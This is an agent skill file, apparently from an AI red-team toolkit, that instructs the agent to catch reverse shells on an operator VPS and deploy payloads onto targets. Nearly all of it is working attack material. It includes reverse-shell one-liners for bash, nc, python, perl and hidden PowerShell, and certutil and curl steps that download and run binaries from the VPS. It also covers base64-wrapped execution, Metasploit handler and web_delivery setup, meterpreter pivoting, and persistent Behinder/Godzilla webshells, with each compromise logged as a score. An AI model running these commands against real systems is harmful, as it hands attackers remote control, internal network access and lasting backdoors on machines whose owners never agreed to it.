---
name: shell-handler
description: "Reverse shell handler & payload delivery: configure MSF/nc/socat listeners on operator VPS to catch callbacks, and deploy staged payloads onto targets"
whenToUse: "When RCE or command execution vulnerabilities are identified, requiring interactive reverse callbacks, payload staging, or upgrading ephemeral execution into persistent sessions"
role: exploit
enabled: true
---

# Reverse Shell Handling & Payload Delivery (Establishing Interactive Sessions)

> **Load VPS Configuration First**: All `$REDTEAM_VPS_HOST` / `$VPS_USER` references in this skill originate from the local configuration,
> initially populated into `$DSH_HOME/.env` by `bash $DSH_HOME/redteam/setup.sh`. Source it prior to each command:
> ```bash
> set -a; . "$DSH_HOME/.env" 2>/dev/null || . "$HOME/.dsh/.env"; set +a
> VPS_USER="${REDTEAM_VPS_USER:-ubuntu}"; VPS="$REDTEAM_VPS_HOST"
> ```
> If unconfigured, run `setup.sh` once (skill `redteam-setup`), which verifies SSH connectivity and payload hosting services.

**Command Execution != Interactive Session**. Ephemeral execution (`?cmd=whoami`) confirms vulnerability existence but cannot sustain continuous operations.
This skill converts command execution into **stable, interactive, and resilient** callback sessions, and deploys follow-on tools (implants, pivot proxies, scanners).

## Local Infrastructure

| Component | Value |
| --- | --- |
| VPS | `$REDTEAM_VPS_HOST` (SSH port 22, private key `$DSH_HOME/redteam/toolkit/vps/id_rsa`) |
| Payload Delivery | `http://$REDTEAM_VPS_HOST:9100/` (fscan, gogo, Behinder shells, Godzilla shells synchronized) |
| Listener Range | `9000-9999` |
| Session Management | `tmux` (listeners must execute inside tmux to prevent session drops) |
| Local Utilities | `nc`, `socat`, `msfconsole` 6.5.3 (`exploit/multi/handler`, `exploit/multi/script/web_delivery` verified) |

Companion Skills: `vps-reverse-shell` (VPS management and listener automation), `webshell-toolkit` (deploying Behinder/Godzilla implants).

## 1. Selection Matrix: Tool Prioritization

| Operational Scenario | Recommended Approach |
| --- | --- |
| **Rapid Verification** (single check to confirm callback) | `nc -lvnp <port>` with target bash/python callback; confirm and proceed |
| **Extended Operation / File Transfers / Pivoting** (**Primary**) | **MSF `multi/handler`** (auto-reconnect, meterpreter upgrade, socks proxying) |
| **Egress Restricted to HTTP(S)** | `web_delivery` (MSF generates one-liner, target pulls payload over HTTP) |
| **Windows Targets (Resilience)** | MSF handler + `shell_to_meterpreter` upgrade |
| **Proxying Internal Traffic** | Upon establishing initial foothold, deploy WebShell -> `suo5-tunnel` rather than relying solely on shell tunnels |

## 2. MSF Multi-Handler (Primary Method)

```bash
# 1) Start listener inside VPS tmux session
tmux new -s handler
msfconsole -q

msf6 > use exploit/multi/handler
msf6 > set payload linux/x64/meterpreter/reverse_tcp   # Windows: windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST $REDTEAM_VPS_HOST
msf6 > set LPORT 9001
msf6 > set ExitOnSession false      # Critical: keep listener active after session disconnects
msf6 > exploit -j                    # Background listener
```

**Port Check**: Ensure port is not in use before listening (`ss -lntp | grep 9001`); verify cloud security group ingress permits traffic.

Full execution chain example:
```bash
# Target side (executed via command execution vulnerability)
bash -c 'bash -i >& /dev/tcp/$REDTEAM_VPS_HOST/9001 0>&1'
# If bash is unavailable, leverage alternative payloads (see below)
```

## 3. Reverse Shell One-Liners (Target-Specific Selection)

```bash
# Linux - bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1

# Linux - sh + mkfifo (when bash is absent)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <IP> <PORT> > /tmp/f

# Linux - python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP>",<PORT>));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'

# Linux - perl
perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# Windows - PowerShell
powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('<IP>',<PORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"

# Windows - certutil staged execution
certutil -urlcache -split -f http://$REDTEAM_VPS_HOST:9100/fscan.exe C:\Windows\Temp\f.exe && C:\Windows\Temp\f.exe -h 10.0.0.0/24

# Linux - curl/wget staged execution
curl -s http://$REDTEAM_VPS_HOST:9100/gogo -o /tmp/gogo && chmod +x /tmp/gogo && /tmp/gogo -i 10.0.0.0/24 -m ss
```

**Payload Encoding**: Encode one-liners in base64 when spaces, quotes, or redirection operators cause shell parsing failures:
```bash
# Encode locally
echo -n 'bash -i >& /dev/tcp/$REDTEAM_VPS_HOST/9001 0>&1' | base64 -w0
# Target execution
echo <BASE64> | base64 -d | bash
```

## 4. MSF web_delivery (HTTP Egress Only)

```bash
msf6 > use exploit/multi/script/web_delivery
msf6 > set target 7              # 7 = Linux Python (check with 'show targets')
msf6 > set payload python/meterpreter/reverse_tcp
msf6 > set LHOST $REDTEAM_VPS_HOST
msf6 > set LPORT 9002
msf6 > exploit -j
# MSF outputs a delivery one-liner (e.g. python -c "import urllib.request;...").
# Execute this string on the target command execution vector -> target fetches payload -> session establishes
```

## 5. Session Upgrades & Post-Exploitation

```bash
# Upgrade standard shell to meterpreter
msf6 > sessions -l
msf6 > sessions -u <id>            # Or execute post/multi/manage/shell_to_meterpreter

# Route internal subnet traffic through meterpreter session
meterpreter > run autoroute -s 10.0.0.0/24
meterpreter > background
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > set VERSION 5
msf6 > exploit -j
# Route local tools through 127.0.0.1:1080 via proxychains
```
> Note: Tunnels established via meterpreter autoroute must be registered under `redteam_tunnel_add` with `entry_kind=target-agent` (routed through compromised target process).
> A proxy running solely on the operator's VPS does not constitute an internal tunnel.

## 6. Operational Discipline

1. **Persistent Execution**: Always run listeners inside tmux sessions (`tmux new -s handler` / `tmux a -t handler`) to prevent dropped shells upon SSH disconnections.
2. **Port Management**: Confirm port availability before binding, ensure cloud firewall ingress is permitted, and allocate ports incrementally within the 9000-9999 range.
3. **Egress Adaptability**: Reverse shells require outbound target connectivity. If direct egress is blocked, test HTTP/HTTPS egress (80/443); if outbound connectivity is completely blocked, pivot to WebShell + tunnel (`suo5-tunnel`).
4. **Stability & Risk**: Avoid payloads or kernel exploits that risk server panics or rebooting services in production environments.
5. **Session Registration**: Immediately log acquired sessions in `redteam_session_check`; log network pivots via `redteam_tunnel_add`.

## 7. Output & Ledger Registration (Mandatory)

1. **Immediate Score Claim**: `redteam_score_hit` (`server-host`), with `evidence` formatted as: "asset | shell_type and privileges" (e.g. `10.0.0.5 | root shell (uid=0)`).
2. **Session Ingestion**: `redteam_access_add` (`method=reverse-shell`, detailing `target`, `user`, `privilege`, listening address, and port).
3. **Tunnel Ingestion** (if pivoting into internal networks): `redteam_tunnel_add`, clearly specifying the target endpoint type (`target-outbound`, `target-http`, or `target-agent`), then verify reachability via `redteam_session_check`.
4. Record key events in `redteam_chain_add`: `stage_code=internet` / `boundary` / `internal`, with `tool` reflecting the full command line text and `result` summarizing execution output (e.g. `uid=0(root) gid=0(root)`).
5. **Operator Deliverable**: Whenever possible, deploy a persistent **Behinder or Godzilla encrypted shell** (`webshell-toolkit`) to provide a durable GUI access point for the operator. Note temporary reverse shells as ephemeral operational channels.
